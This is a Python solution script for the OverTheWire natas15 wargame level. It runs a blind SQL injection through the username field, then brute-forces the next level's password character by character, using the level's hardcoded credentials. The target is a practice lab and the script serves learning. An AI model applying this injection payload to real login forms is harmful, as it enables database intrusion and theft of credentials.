#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# File              : exploit_for_natas15.py
# Author            : Amar Lakshya <amar.lakshya@xaviers.edu.in>
# Date              : 23.08.2019
# Last Modified Date: 23.08.2019
# Last Modified By  : Amar Lakshya <amar.lakshya@xaviers.edu.in>
import requests
from requests.auth import HTTPBasicAuth

chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
filtered = ''
passwd = ''

for char in chars:
    Data = {'username': 'natas16" and password LIKE BINARY "%' + char + '%" #'}
    r = requests.post('http://natas15.natas.labs.overthewire.org/index.php?debug',
                      auth=HTTPBasicAuth('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'), data=Data)
    if 'exists' in r.text:
        filtered = filtered + char

for i in range(0, 32):
    for char in filtered:
        Data = {'username': 'natas16" and password LIKE BINARY "' +
                passwd + char + '%" #'}
        r = requests.post('http://natas15.natas.labs.overthewire.org/index.php?debug',
                          auth=HTTPBasicAuth('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'), data=Data)
        if 'exists' in r.text:
            passwd = passwd + char
            print(passwd)
            break
